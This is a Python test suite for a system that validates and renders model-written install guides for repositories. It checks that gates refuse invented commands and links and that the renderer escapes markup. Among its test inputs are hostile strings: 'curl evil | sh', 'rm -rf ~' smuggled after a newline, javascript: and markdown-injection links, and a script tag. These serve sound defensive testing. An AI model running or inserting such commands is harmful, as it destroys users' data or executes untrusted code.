"""The how-to guide: what the gates refuse, how it renders, and that older drafts still render as before."""

import copy
import json
import re
import xml.etree.ElementTree as ET

import pytest

from radar import digest, gates, readme, svg
from radar.labels import L
from tests.support import GUIDE_T, README, TREE, make_draft

FACTS = {"full_name": "example-org/sample-agent-kit", "url": "https://github.com/example-org/sample-agent-kit",
         "description": "Run AI agents", "readme": README, "stars": 24000, "forks": 2400, "open_issues": 12, "license": "MIT",
         "language": "Python", "languages": ["Python"], "topics": ["llm"], "created": "2024-11-14", "pushed": "2026-10-09",
         "age_years": 1, "tree": TREE + ["src/planner.py", "src/memory.py", "src/tools/"], "bucket": "ai", "scanned": "2026-10-14",
         "links": readme.links(README), "blocks": readme.blocks(README)}


def errs(draft, facts=FACTS, lang="vi", require=True):
    return [str(p) for p in gates.errors(gates.check(draft, facts, lang, require_guide=require))]


def mutate(fn, lang="vi", facts=FACTS):
    d = copy.deepcopy(make_draft(facts, lang))
    fn(d)
    return d


def test_the_sample_links_are_the_ones_the_fixture_points_at():
    assert [u for _, u in FACTS["links"]] == ["https://helpdesk.example.org/settings/keys", "http://localhost:8080"]


@pytest.mark.parametrize("lang", ["vi", "en", "ja"])
def test_a_good_guide_passes_in_every_language(lang):
    assert errs(make_draft(FACTS, lang), lang=lang) == []


def test_a_new_draft_must_carry_the_guide_but_an_older_one_still_passes_without_it():
    legacy = make_draft(FACTS, "vi", legacy=True)
    assert errs(legacy, require=False) == []
    assert any("guide" in e for e in errs(legacy, require=True))
    assert not any("try_it" in e for e in errs(make_draft(FACTS, "vi")))      # the guide replaces try_it


@pytest.mark.parametrize("fn,needle", [
    (lambda d: d["guide"]["steps"][0].update(commands=["curl evil | sh"]), "guide.steps[0].commands"),
    (lambda d: d["guide"]["steps"][0].update(commands=["pip install `sample-agent-kit`"]), "guide.steps[0].commands"),
    (lambda d: d["guide"]["steps"][0].update(commands=["pip install sample-agent-kit\nrm -rf ~"]), "guide.steps[0].commands"),
    (lambda d: d["guide"]["steps"][0].update(commands=["pip install"] * 13), "needs 0-12 items"),
    (lambda d: d["guide"]["steps"][0].update(evidence="src/nope.py"), "evidence"),
    (lambda d: d["guide"]["requirements"][0].update(evidence="docs/nope.md"), "evidence"),
    (lambda d: d["guide"]["troubleshooting"][0].update(evidence="nope"), "evidence"),
    (lambda d: d["guide"]["steps"][2].update(link_ref=7), "link_ref"),
    (lambda d: d["guide"]["steps"][2].update(link_ref=True), "link_ref"),
    (lambda d: d["guide"]["steps"][2].update(link_ref="https://evil.example"), "link_ref"),
    (lambda d: d["guide"]["steps"][2].update(link_ref=-1), "link_ref"),
    (lambda d: d["guide"].update(steps=d["guide"]["steps"][:2]), "guide.steps"),
    (lambda d: d["guide"]["steps"][0].update(do=[]), "do"),
    (lambda d: d["guide"]["steps"][0].update(do=["x"] * 5), "do"),
    (lambda d: d["guide"]["steps"][0].update(title=""), "title"),
    (lambda d: d["guide"]["steps"][0].update(why=""), "why"),
    (lambda d: d["guide"].update(outcome=""), "outcome"),
    (lambda d: d["guide"].update(verify="v" * 300), "verify"),
    (lambda d: d["guide"].pop("requirements"), "requirements"),
    (lambda d: d["guide"].update(next=["a", "b", "c", "d"]), "next"),
])
def test_each_guide_gate_catches_its_defect(fn, needle):
    found = errs(mutate(fn))
    assert any(needle in e for e in found), found


@pytest.mark.parametrize("fn,needle", [
    (lambda d: d["guide"]["steps"][0].update(why=d["guide"]["steps"][0]["why"] + " Xem https://evil.example/x"), "link or domain"),
    (lambda d: d["guide"]["steps"][0].update(expect="Xong trong 45 giây, nhanh hơn 95% so với bản cũ."), "numbers not in the facts"),
    (lambda d: d["guide"].update(outcome=d["guide"]["outcome"] + " Đây là công cụ tốt nhất thế giới."), "hype"),
    (lambda d: d["guide"]["steps"][0]["do"].append("Chạy `rm -rf ~` để dọn dẹp."), "is not in the README or the repository"),
    (lambda d: d["guide"]["steps"][0]["do"].append("Chạy `sample-agent run để thử."), "unbalanced backtick"),
    (lambda d: d["guide"]["next"].append("Mở [trang này](b) nhé"), "link or domain"),
    (lambda d: d["guide"]["troubleshooting"][0].update(fix="Xem evil[.]com để biết thêm"), "link or domain"),
    (lambda d: d["guide"]["requirements"][0].update(detail="Cần 64 GB bộ nhớ."), "numbers not in the facts"),
])
def test_the_text_gates_reach_every_sentence_of_the_guide(fn, needle):
    found = errs(mutate(fn))
    assert any(needle in e for e in found), found


def test_a_code_span_may_name_the_readme_or_a_file_of_the_repository():
    ok = mutate(lambda d: d["guide"]["steps"][0]["do"].append("Mở `config.example.toml`, rồi xem `src/planner.py` và `pyproject.toml`."))
    assert errs(ok) == []


def test_a_command_the_readme_splits_over_lines_is_given_as_one_line():
    one = mutate(lambda d: d["guide"]["steps"][4].update(commands=["sample-agent console --port 8080"]))
    assert errs(one) == []
    half = mutate(lambda d: d["guide"]["steps"][4].update(commands=["sample-agent console"]))
    assert any("guide.steps[4].commands" in e for e in errs(half))


def test_a_guide_without_commands_is_refused_when_the_readme_has_them():
    bare = mutate(lambda d: [s.update(commands=[]) for s in d["guide"]["steps"]])
    assert any("uses none of them" in e for e in errs(bare))
    # a README with no code blocks gives the guide nothing to copy, and that is allowed
    plain = {**FACTS, "readme": "# Tool\n\nA desktop app. Download it, put your key in config.toml, and drag a video onto the window.\n"}
    assert errs(bare, plain) == []


def test_a_thin_guide_is_a_warning_not_an_error():
    big = {**FACTS, "readme": FACTS["readme"] + "\n```bash\npip install a\npip install b\npip install c\npip install d\n```\n"}
    thin = mutate(lambda d: [s.update(commands=[]) for s in d["guide"]["steps"][1:]], facts=big)
    thin["guide"]["steps"][0]["commands"] = ["pip install sample-agent-kit"]
    problems = gates.check(thin, big, "vi", require_guide=True)
    assert not gates.errors(problems) and any(p.level == "warn" and "uses 1 of" in p.message for p in problems)
    used, wanted = gates.command_coverage(thin, big)
    assert (used, wanted) == (1, 8)


def test_coverage_counts_distinct_readme_commands_the_draft_uses():
    used, wanted = gates.command_coverage(make_draft(FACTS, "vi"), FACTS)
    assert (used, wanted) == (4, 4)


def test_a_link_ref_may_point_at_a_link_that_exists():
    assert errs(mutate(lambda d: d["guide"]["steps"][2].update(link_ref=1))) == []
    no_links = {k: v for k, v in FACTS.items() if k != "links"}
    assert any("link_ref" in e for e in errs(mutate(lambda d: d["guide"]["steps"][2].update(link_ref=0)), no_links))


# ---- rendering ---------------------------------------------------------------------------------------------

def render(tmp_path, draft, lang="vi", facts=FACTS):
    digest.render_repo(tmp_path, "2026-10-14", facts, {lang: draft})
    folder = digest.repo_dir(tmp_path, "2026-10-14", facts)
    return folder, (folder / f"{lang}.md").read_text(encoding="utf-8")


def test_the_digest_leads_with_the_outcome_then_what_to_prepare_then_every_step(tmp_path):
    folder, md = render(tmp_path, make_draft(FACTS, "vi"))
    t = L["vi"]
    order = [t["outcome"], t["before"], t["roadmap"], t["do_steps"], f"{t['step']} 1 · Cài gói", f"{t['step']} 5 · ", t["verify"], t["trouble"],
             t["next"], t["inside"], t["learn"]]
    positions = [md.index(x) for x in order]
    assert positions == sorted(positions), dict(zip(order, positions))
    assert "- [ ] **Python và pip**" in md                                 # a checklist the reader ticks off
    assert "```bash\npip install sample-agent-kit\n```" in md
    assert "```bash\nsample-agent console --port 8080\n```" in md          # joined from the README's two lines
    assert "path-vi.svg" in md and (folder / "path-vi.svg").exists()
    assert t["expect"] in md and "Hàng đợi hiện ra." in md


def test_a_readme_address_is_printed_by_the_renderer_and_a_local_one_is_code(tmp_path):
    _, md = render(tmp_path, make_draft(FACTS, "vi"))
    assert f"{L['vi']['get_link']}: [the helpdesk key page](https://helpdesk.example.org/settings/keys)" in md
    assert "`http://localhost:8080`" in md and "](http://localhost:8080)" not in md


def test_a_stored_link_that_is_not_a_plain_address_is_never_printed(tmp_path):
    hostile = {**FACTS, "links": [["click", "javascript:alert(1)"], ["x", "https://a.example/b)[evil](https://evil.example/)"], ["y", "https://ok.example.org/p"]]}
    d = mutate(lambda d: d["guide"]["steps"][2].update(link_ref=0), facts=hostile)
    d["guide"]["requirements"][1]["link_ref"] = 1
    _, md = render(tmp_path, d, facts=hostile)
    assert "javascript" not in md and "a.example" not in md and "evil" not in md
    d2 = mutate(lambda d: d["guide"]["steps"][2].update(link_ref=2), facts=hostile)
    assert "[y](https://ok.example.org/p)" in render(tmp_path / "again", d2, facts=hostile)[1]


def test_fields_cannot_turn_into_headings_or_lists_in_the_guide(tmp_path):
    d = mutate(lambda d: (d["guide"]["steps"][0].update(why="# Tiêu đề lạ", expect="- mục lạ"), d["guide"].update(verify="> trích dẫn")))
    _, md = render(tmp_path, d)
    assert "\n# Tiêu đề lạ" not in md and "**Mục đích:** \\# Tiêu đề lạ" in md
    assert "\n> trích dẫn" not in md


def test_the_draft_with_its_guide_is_kept_and_the_links_it_points_at_with_it(tmp_path):
    folder, _ = render(tmp_path, make_draft(FACTS, "vi"))
    stored = json.loads((folder / "draft-vi.json").read_text(encoding="utf-8"))
    assert stored["draft"]["guide"]["steps"][2]["link_ref"] == 0 and stored["facts"]["links"] == FACTS["links"]
    assert stored["draft"]["guide"]["steps"][2]["snippet_ref"] == 0 and stored["facts"]["blocks"] == FACTS["blocks"]


def test_a_draft_from_before_the_guide_renders_exactly_the_older_layout(tmp_path):
    folder, md = render(tmp_path, make_draft(FACTS, "vi", legacy=True))
    assert L["vi"]["try"] in md and L["vi"]["do_steps"] not in md and not (folder / "path-vi.svg").exists()
    assert "```bash\npip install sample-agent-kit\nsample-agent run --queue support\n```" in md
    old = {k: v for k, v in FACTS.items() if k not in ("links", "blocks")}
    folder2, _ = render(tmp_path / "old", make_draft(old, "vi", legacy=True), facts=old)
    stored_facts = json.loads((folder2 / "draft-vi.json").read_text(encoding="utf-8"))["facts"]
    assert "links" not in stored_facts and "blocks" not in stored_facts


@pytest.mark.parametrize("lang", ["vi", "en", "ja"])
def test_the_roadmap_is_wellformed_and_escapes_hostile_text(lang):
    g = copy.deepcopy(make_draft(FACTS, lang)["guide"])
    g["steps"][0]["title"] = '<script>alert(1)</script> & "x"'
    out = svg.roadmap(g["steps"], L[lang]["roadmap"], g["outcome"], L[lang])
    root = ET.fromstring(out)
    assert root.tag.endswith("svg") and "<script>" not in out and "&lt;script&gt;" in out
    assert GUIDE_T[lang]["steps"][1][0] in out


def test_the_chip_of_a_step_counts_a_whole_heredoc_as_one_command():
    heredoc = ["cat > big.yml <<EOF"] + [f"k{i}: {i}" for i in range(19)] + ["EOF"]
    step = {"title": "Ghi tệp cấu hình", "why": "Tạo tệp.", "commands": heredoc + ["pip install sample-agent-kit"]}
    out = svg.roadmap([step], "Lộ trình", "Kết quả", L["vi"])
    assert f"2 {L['vi']['commands']}" in out and f"22 {L['vi']['commands']}" not in out
    ET.fromstring(out)


def test_the_roadmap_survives_ten_long_steps():
    steps = [{"title": "Một bước rất dài " * 6, "why": "Giải thích cũng rất dài " * 12, "commands": ["a"] * (i % 6)} for i in range(10)]
    ET.fromstring(svg.roadmap(steps, "Lộ trình", "Kết quả " * 40, L["vi"]))


def test_the_index_of_a_run_says_what_each_guide_ends_with_and_how_many_steps_it_has(tmp_path):
    legacy_facts = {**FACTS, "full_name": "example-org/sample-old", "url": "https://github.com/example-org/sample-old"}
    entries = [{"facts": FACTS, "drafts": {"vi": make_draft(FACTS, "vi")}},
               {"facts": legacy_facts, "drafts": {"vi": make_draft(legacy_facts, "vi", legacy=True)}}]
    digest.render_index(tmp_path, "2026-10-14", entries, "vi")
    text = (tmp_path / "digests" / "2026-10-14" / "README.md").read_text(encoding="utf-8")
    assert f"🎯 {GUIDE_T['vi']['outcome']} · 🪜 5 {L['vi']['steps_n']}" in text
    assert text.count("🎯") == 1                         # a draft from before the guide gets no such line


# ---- a model may answer with any JSON: the gates must return Problems, never raise ---------------------------

ODD = [None, 1, True, "`x`", [], ["a"], [1], {}, {"a": 1}]


def paths(node, prefix=()):
    """Every key path of a draft: a list is entered by position, so each element is mutated on its own."""
    yield prefix
    if isinstance(node, dict):
        for k, v in node.items():
            yield from paths(v, prefix + (k,))
    elif isinstance(node, list):
        for i, v in enumerate(node):
            yield from paths(v, prefix + (i,))


def value_at(draft, path):
    for key in path:
        draft = draft[key]
    return draft


def replace_at(draft, path, value):
    d = copy.deepcopy(draft)
    if not path:
        return value
    node = d
    for key in path[:-1]:
        node = node[key]
    node[path[-1]] = value
    return d


def test_the_gates_never_raise_whatever_shape_a_model_sends_for_any_field():
    base = make_draft(FACTS, "vi")
    tried = 0
    for path in paths(base):
        for odd in ODD:
            draft = replace_at(base, path, odd)
            if not isinstance(draft, dict):
                continue
            gates.schema(draft)
            gates.check(draft, FACTS, "vi", require_guide=True)
            tried += 1
    assert tried > 1000


def test_the_gates_never_raise_when_a_model_adds_reference_keys_to_any_guide_item():
    """An item may carry a key the schema does not list for it (snippet_ref on a requirement, link_ref on a troubleshooting entry)."""
    base = make_draft(FACTS, "vi")
    guide_items = [path for path in paths(base) if path[:1] == ("guide",) and isinstance(value_at(base, path), dict)]
    assert len(guide_items) == 9                 # the guide, its two requirements, five steps and one troubleshooting entry
    tried = 0
    for path in guide_items:
        for key in ("link_ref", "snippet_ref"):
            for odd in ODD + [1.5, "0", -1, 99]:
                draft = replace_at(base, path + (key,), odd)
                gates.schema(draft)
                gates.check(draft, FACTS, "vi", require_guide=True)
                tried += 1
    assert tried == 9 * 2 * len(ODD + [1.5, "0", -1, 99])


def test_the_gates_never_raise_when_any_known_field_name_is_added_to_any_object_of_a_draft():
    import random
    rng = random.Random(11)
    base = make_draft(FACTS, "vi")
    keys = ["evidence", "commands", "do", "link_ref", "snippet_ref", "text", "name", "steps", "requirements", "troubleshooting", "hashtags", "flow", "try_it"]
    objects = [path for path in paths(base) if isinstance(value_at(base, path), dict)]
    tried = 0
    for path in objects:
        for key in keys:
            draft = replace_at(base, path + (key,), rng.choice(ODD + [1.5, -1, 10 ** 30, [None], [{}]]))
            gates.schema(draft)
            gates.check(draft, FACTS, "vi", require_guide=True)
            gates.command_coverage(draft, FACTS)
            gates.canonicalize(draft, FACTS)
            tried += 1
    assert tried == len(objects) * len(keys) and len(objects) >= 15


@pytest.mark.parametrize("where", ["requirements", "steps", "troubleshooting"])
@pytest.mark.parametrize("key", ["link_ref", "snippet_ref"])
@pytest.mark.parametrize("bad", ["x", [1], 1.5, True, -1])
def test_a_reference_of_the_wrong_kind_is_an_error_on_every_item_of_the_guide(where, key, bad):
    found = errs(mutate(lambda d: d["guide"][where][0].update({key: bad})))
    assert any(f"{where}[0].{key}" in e for e in found), found


def test_a_draft_that_is_not_an_object_at_all_is_refused_by_the_caller_not_by_a_crash():
    from radar.llm import parse_json
    for text in ('["a"]', '"x"', "3", "null"):
        try:
            parse_json(text)
        except ValueError:
            pass
        else:
            raise AssertionError(f"parse_json accepted {text!r}")


def test_a_config_sample_is_printed_exactly_as_the_readme_has_it(tmp_path):
    _, md = render(tmp_path, make_draft(FACTS, "vi"))
    assert f"_{L['vi']['snippet']}_\n\n```toml\n[helpdesk]\nkey = \"YOUR_KEY\"\nqueue = \"support\"\n```" in md


def test_a_snippet_ref_must_name_a_block_the_readme_has():
    assert errs(mutate(lambda d: d["guide"]["steps"][2].update(snippet_ref=0))) == []
    for bad in (5, -1, True, "0", [0], 1.0):
        assert any("snippet_ref" in e for e in errs(mutate(lambda d: d["guide"]["steps"][2].update(snippet_ref=bad)))), bad
    no_blocks = {k: v for k, v in FACTS.items() if k != "blocks"}
    assert any("snippet_ref" in e for e in errs(mutate(lambda d: d["guide"]["steps"][2].update(snippet_ref=0)), no_blocks))


def test_a_stored_block_that_is_unsafe_is_never_printed(tmp_path):
    hostile = {**FACTS, "blocks": [["<script>", "x"], ["yaml", "a: 1\n" * 60], ["yaml", "k: ```\nv: 1"]]}
    d = mutate(lambda d: [d["guide"]["steps"][2].update(snippet_ref=1), d["guide"]["steps"][3].update(snippet_ref=2)], facts=hostile)
    _, md = render(tmp_path, d, facts=hostile)
    assert "a: 1\na: 1" not in md                                   # 60 lines: too long to print
    assert "````yaml\nk: ```\nv: 1\n````" in md                    # a fence inside the text gets a longer fence around it
    d = mutate(lambda d: d["guide"]["steps"][2].update(snippet_ref=0), facts=hostile)
    assert "<script>" not in render(tmp_path / "x", d, facts=hostile)[1]       # a language tag that is not plain is dropped


def test_stars_and_angle_brackets_in_the_guide_prose_stay_plain_text(tmp_path):
    d = mutate(lambda d: d["guide"]["steps"][0].update(why="Kích thước 1280*704 hoặc 704*1280, đặt <user> thay cho tên, xem `a<b*c`."))
    _, md = render(tmp_path, d)
    assert "1280\\*704 hoặc 704\\*1280" in md and "&lt;user>" in md and "`a<b*c`" in md


def test_the_coverage_rule_does_not_count_a_config_sample_as_a_command():
    assert gates.command_coverage(make_draft(FACTS, "vi"), FACTS) == (4, 4)


def test_a_stored_link_with_an_unparsable_host_is_never_printed_and_never_raises(tmp_path):
    hostile = {**FACTS, "links": [["x", "http://[HOST]:8080"], ["y", "https://ok.example.org/p"]]}
    d = mutate(lambda d: d["guide"]["steps"][2].update(link_ref=0), facts=hostile)
    _, md = render(tmp_path, d, facts=hostile)
    assert "[HOST]" not in md


CONSOLE_README = README + "\n```console\n> npm install x\nPS C:\\> pip install y\n$ make\n```\n"
CONSOLE_FACTS = {**FACTS, "readme": CONSOLE_README, "links": readme.links(CONSOLE_README), "blocks": readme.blocks(CONSOLE_README)}


def test_a_command_copied_with_its_prompt_is_shown_without_it_and_both_forms_pass_the_gate(tmp_path):
    for commands in (["> npm install x", "PS C:\\> pip install y", "$ make"], ["npm install x", "pip install y", "make"]):
        d = make_draft(CONSOLE_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=commands, evidence="README")
        assert not any("commands" in e for e in errs(d, CONSOLE_FACTS)), commands
        md = render(tmp_path / str(len(commands[0])), gates.canonicalize(d, CONSOLE_FACTS), facts=CONSOLE_FACTS)[1]      # as write_one stores it
        assert "```bash\nnpm install x\npip install y\nmake\n```" in md and "> npm install" not in md and "PS C:" not in md


def test_the_commands_of_a_readme_with_a_prompt_count_as_coverage():
    d = make_draft(CONSOLE_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["npm install x"])
    assert gates.command_coverage(d, CONSOLE_FACTS)[1] == 7               # the four of the fixture plus the three prompted lines


def test_what_npm_prints_after_a_typed_command_is_not_in_the_allowlist_and_the_prompt_of_root_is_dropped():
    transcript = "```console\n$ npm start\n> myapp@1.0.0 start\n> node index.js\nServer started\n```\n"
    commands = gates.readme_commands(transcript)
    assert "npm start" in commands and not {"node index.js", "myapp@1.0.0 start", "Server started"} & commands
    assert gates.block_commands(transcript) == {"npm start"}
    root = "```console\n# apt-get update\n# apt-get install ffmpeg\nReading package lists...\n```\n"
    assert gates.block_commands(root) == {"apt-get update", "apt-get install ffmpeg"}
    assert gates.command_texts(root)["apt-get update"] == ["apt-get update"]
    typed = "```console\n> npm install x\n> npm run build\n```\n"
    assert gates.block_commands(typed) == {"npm install x", "npm run build"}


def test_model_prose_in_the_tables_of_the_guide_is_shown_literally(tmp_path):
    d = mutate(lambda d: (d["guide"]["troubleshooting"][0].update(problem="Thiếu <MODEL> và *đậm* | cột", fix="Mở <details> và xem *chữ*"),
                          d["how_it_works"]["components"][0].update(name="Tên *x*", role="Vai <b>trò</b>")))
    _, md = render(tmp_path, d)
    row = next(line for line in md.splitlines() if "MODEL" in line)
    assert row.startswith("| Thiếu &lt;MODEL> và \\*đậm\\* \\| cột | Mở &lt;details> và xem \\*chữ\\* |")
    part = next(line for line in md.splitlines() if "Vai" in line)
    assert part.startswith("| **Tên \\*x\\*** | Vai &lt;b>trò&lt;/b> |")
    assert "<b>" not in md and "<details>" not in md


def test_the_image_alt_text_of_a_guide_cannot_close_the_image_or_open_markup(tmp_path):
    d = mutate(lambda d: d.update(title="Tên ] lạ <i>x</i> *y*"))
    first = render(tmp_path, d)[1].splitlines()[2]
    assert first == "![Tên  lạ ix/i y](card-vi.svg)"


def test_the_index_of_a_run_shows_the_outcome_title_and_summary_of_a_guide_as_plain_text(tmp_path):
    d = make_draft(FACTS, "vi")
    d["guide"]["outcome"] = "Dựng <MODEL> với *đậm*"
    d["title"], d["one_liner"] = "Tên <b>lạ</b> *x*", "Tóm tắt <i>y</i>"
    digest.render_index(tmp_path, "2026-10-14", [{"facts": FACTS, "drafts": {"vi": d}}], "vi")
    text = (tmp_path / "digests" / "2026-10-14" / "README.md").read_text(encoding="utf-8")
    assert "Dựng &lt;MODEL> với \\*đậm\\*" in text and "<b>" not in text and "<i>" not in text and "<MODEL>" not in text


SED_README = README + "\n```bash\nsed 's/foo  bar/baz/' file\n```\n"
SED_FACTS = {**FACTS, "readme": SED_README, "links": readme.links(SED_README), "blocks": readme.blocks(SED_README)}


def test_a_command_keeps_the_spaces_the_readme_has_even_if_the_model_collapsed_them(tmp_path):
    collapsed, exact = "sed 's/foo bar/baz/' file", "sed 's/foo  bar/baz/' file"
    d = make_draft(SED_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=[collapsed], evidence="README")
    assert not any("commands" in e for e in errs(d, SED_FACTS))                  # the gate compares with spaces collapsed ...
    fixed = gates.canonicalize(d, SED_FACTS)
    assert fixed["guide"]["steps"][0]["commands"] == [exact] and d["guide"]["steps"][0]["commands"] == [collapsed]   # ... the stored draft does not
    assert f"```bash\n{exact}\n```" in render(tmp_path, fixed, facts=SED_FACTS)[1]
    again = gates.canonicalize(fixed, SED_FACTS)
    assert again == fixed                                                        # idempotent


def test_canonicalize_restores_the_readme_text_of_a_prompted_command_and_leaves_an_unknown_one_alone():
    d = make_draft(CONSOLE_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["> npm  install x", "PS C:\\> pip install y", "never in the readme"], evidence="README")
    out = gates.canonicalize(d, CONSOLE_FACTS)["guide"]["steps"][0]["commands"]
    assert out == ["npm install x", "pip install y", "never in the readme"]       # still refused by the gate, as before
    assert any("never in the readme" in e for e in errs(d, CONSOLE_FACTS))


def test_the_renderer_removes_only_the_prompt_and_the_ends_of_a_command(tmp_path):
    d = make_draft(SED_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["$ sed 's/foo  bar/baz/' file   "], evidence="README")
    assert "```bash\nsed 's/foo  bar/baz/' file\n```" in render(tmp_path, d, facts=SED_FACTS)[1]


REDIRECT_README = README + "\n```bash\n> output.log\n$ echo hi > out.txt\n```\n\n```console\n> npm install x\n```\n"
REDIRECT_FACTS = {**FACTS, "readme": REDIRECT_README, "links": readme.links(REDIRECT_README), "blocks": readme.blocks(REDIRECT_README)}


def test_a_leading_redirection_in_a_shell_block_is_a_command_not_a_prompt(tmp_path):
    """`> output.log` in a bash block truncates a file; only a console transcript uses `> ` as a prompt."""
    assert readme.setup_commands(REDIRECT_README)[-3:] == ["> output.log", "echo hi > out.txt", "npm install x"]
    d = make_draft(REDIRECT_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["> output.log", "$ echo hi > out.txt", "> npm install x"], evidence="README")
    assert not any("commands" in e for e in errs(d, REDIRECT_FACTS))
    fixed = gates.canonicalize(d, REDIRECT_FACTS)["guide"]["steps"][0]["commands"]
    assert fixed == ["> output.log", "echo hi > out.txt", "npm install x"]
    d["guide"]["steps"][0]["commands"] = ["output.log"]                             # the prompt-less form of a redirection is the same key ...
    assert gates.canonicalize(d, REDIRECT_FACTS)["guide"]["steps"][0]["commands"] == ["> output.log"]        # ... and is put right
    md = render(tmp_path, gates.canonicalize(d, REDIRECT_FACTS), facts=REDIRECT_FACTS)[1]
    assert "```bash\n> output.log\n```" in md


def test_a_piece_of_a_command_the_readme_splits_over_lines_is_not_a_command():
    text = README + "\n```bash\ntorchrun --nproc_per_node=8 generate.py \\\n  --task t2v-A14B \\\n  --size 1280\n```\n"
    facts = {**FACTS, "readme": text, "links": readme.links(text), "blocks": readme.blocks(text)}
    whole = "torchrun --nproc_per_node=8 generate.py --task t2v-A14B --size 1280"
    for command, ok in ((whole, True), ("--size 1280", False), ("--task t2v-A14B --size 1280", False), ("torchrun --nproc_per_node=8 generate.py", False)):
        d = make_draft(facts, "vi")
        d["guide"]["steps"][0].update(commands=[command], evidence="README")
        assert (not any("steps[0].commands" in e for e in errs(d, facts))) is ok, command


TICKS_README = (README + "\n```bash\nexport VERSION=`git describe --tags`\nexport BUILD=`date +%s`\n```\n\n"
                "Run `pip install tick-tool` first.\n\n`pip install wrapped-tool`\n")
TICKS_FACTS = {**FACTS, "readme": TICKS_README, "links": readme.links(TICKS_README), "blocks": readme.blocks(TICKS_README)}


def test_a_command_with_backticks_is_accepted_when_a_code_block_of_the_readme_has_it_and_not_when_they_are_markdown(tmp_path):
    """`export V=`git describe`` is command substitution in a shell block; the backticks around a span of prose are Markdown and must not be typed."""
    cases = (("export VERSION=`git describe --tags`", True), ("export BUILD=`date +%s`", True), ("pip install tick-tool", True),
             ("pip install wrapped-tool", True), ("`pip install wrapped-tool`", False), ("`pip install tick-tool`", False),
             ("export VERSION=git describe --tags", False), ("export VERSION=`git describe --tags", False))
    for command, ok in cases:
        d = make_draft(TICKS_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=[command], evidence="README")
        assert (not any("steps[0].commands" in e for e in errs(d, TICKS_FACTS))) is ok, command
    d = make_draft(TICKS_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["export VERSION=`git describe --tags`", "export BUILD=`date +%s`"], evidence="README")
    fixed = gates.canonicalize(d, TICKS_FACTS)
    assert fixed["guide"]["steps"][0]["commands"] == ["export VERSION=`git describe --tags`", "export BUILD=`date +%s`"]
    assert "```bash\nexport VERSION=`git describe --tags`\nexport BUILD=`date +%s`\n```" in render(tmp_path, fixed, facts=TICKS_FACTS)[1]


def test_the_fence_of_a_command_block_is_longer_than_any_run_of_backticks_in_it(tmp_path):
    d = make_draft(FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["echo ```x```", "echo ok"])
    md = render(tmp_path, d)[1]
    assert "````bash\necho ```x```\necho ok\n````" in md


def test_a_link_with_a_pair_of_parentheses_is_printed_as_a_working_markdown_link():
    facts = {**FACTS, "links": [["Foo", "https://example.org/wiki/Foo_(bar)"]]}
    assert digest._link(facts, 0, L["vi"]).endswith("[Foo](https://example.org/wiki/Foo_(bar))")


PWSH_README = README + "\n```powershell\nInvoke-WebRequest `\n  -Uri http://localhost:9 `\n  -Method Get\n```\n"
PWSH_FACTS = {**FACTS, "readme": PWSH_README, "links": readme.links(PWSH_README), "blocks": readme.blocks(PWSH_README)}


def test_a_piece_of_a_powershell_command_wrapped_with_backticks_is_not_a_command():
    whole = "Invoke-WebRequest -Uri http://localhost:9 -Method Get"
    for command, ok in ((whole, True), ("-Uri http://localhost:9 -Method Get", False), ("-Method Get", False), ("Invoke-WebRequest", False)):
        d = make_draft(PWSH_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=[command], evidence="README")
        assert (not any("steps[0].commands" in e for e in errs(d, PWSH_FACTS))) is ok, command


PAPER_README = re.sub(r"```.*?```", "", README, flags=re.S)                      # the fixture README without its code blocks: nothing to run
PAPER_FACTS = {**FACTS, "readme": PAPER_README, "links": readme.links(PAPER_README), "blocks": readme.blocks(PAPER_README)}


def short_guide(facts, steps):
    d = copy.deepcopy(make_draft(facts, "vi"))
    d["guide"]["steps"] = d["guide"]["steps"][:steps]
    for item in d["guide"]["steps"] + d["guide"]["requirements"] + d["guide"]["troubleshooting"]:
        item.pop("link_ref", None), item.pop("snippet_ref", None)
    for step in d["guide"]["steps"]:
        step["commands"] = []
    return d


def test_a_readme_with_nothing_to_run_may_have_a_guide_of_one_or_two_steps_and_one_with_commands_may_not(tmp_path):
    for steps in (1, 2):
        d = short_guide(PAPER_FACTS, steps)
        assert not any("steps" in e for e in errs(d, PAPER_FACTS)), (steps, errs(d, PAPER_FACTS))
        md = render(tmp_path / str(steps), d, facts=PAPER_FACTS)[1]
        assert f"{L['vi']['step']} {steps} · " in md and (tmp_path / str(steps)).exists()
        svg_text = next((tmp_path / str(steps)).rglob("path-vi.svg")).read_text(encoding="utf-8")
        ET.fromstring(svg_text)                                                                 # the roadmap of so few steps is still a valid drawing
    none = short_guide(PAPER_FACTS, 1)
    none["guide"]["steps"] = []
    assert any("needs 1-10 items" in e for e in errs(none, PAPER_FACTS))                      # a guide still has at least one step
    d = short_guide(FACTS, 2)
    assert any("guide.steps" in e and "needs 3-10 steps" in e for e in errs(d))               # the README of the fixture shows many commands


def test_a_command_is_fenced_in_the_shell_the_readme_writes_it_for_and_a_step_with_two_shells_names_each(tmp_path):
    facts = {**FACTS, "shells": {".\\webui.bat": "powershell", "webui.bat": "bat"}}
    only = make_draft(facts, "vi")
    only["guide"]["steps"][0].update(commands=[".\\webui.bat"])
    folder, md = render(tmp_path / "one", only, facts=facts)
    assert f"_{L['vi']['shell_powershell']}_\n\n```powershell\n.\\webui.bat\n```" in md
    assert json.loads((folder / "draft-vi.json").read_text(encoding="utf-8"))["facts"]["shells"] == facts["shells"]      # rerender sees the same shells
    mixed = make_draft(facts, "vi")
    mixed["guide"]["steps"][0].update(commands=["pip install x", "pip install y", ".\\webui.bat", "webui.bat", "git status"])
    md = render(tmp_path / "two", mixed, facts=facts)[1]
    t = L["vi"]
    assert (f"_{t['shell_bash']}_\n\n```bash\npip install x\npip install y\n```\n\n_{t['shell_powershell']}_\n\n```powershell\n.\\webui.bat\n```\n\n"
            f"_{t['shell_bat']}_\n\n```bat\nwebui.bat\n```\n\n_{t['shell_bash']}_\n\n```bash\ngit status\n```") in md
    plain = make_draft(FACTS, "vi")
    plain["guide"]["steps"][0].update(commands=["pip install x", "pip install y"])
    assert "```bash\npip install x\npip install y\n```" in render(tmp_path / "three", plain)[1] and t["shell_bash"] not in render(tmp_path / "four", plain)[1]
